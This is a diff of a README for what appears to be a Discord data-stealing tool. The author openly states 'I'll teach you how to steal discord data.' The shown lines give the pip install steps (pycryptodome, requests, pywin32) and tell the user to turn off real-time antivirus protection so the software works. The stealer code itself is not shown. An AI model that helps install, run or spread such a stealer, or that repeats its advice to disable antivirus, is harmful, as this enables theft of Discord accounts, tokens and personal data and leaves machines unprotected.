@@ -6,7 +6,7 @@ I’m @sleshTekk I'll teach you how to steal discord data. #You will need to ins
 ❗️ You will need to install the library to open the software in cmd.
     
     pip install pycryptodome
-    python3 -m pip install requests
+    pip install requests
     pip install pywin32
   
  ❗️ To run the software, in order for it to work, you need to turn off real-time protection❗️  
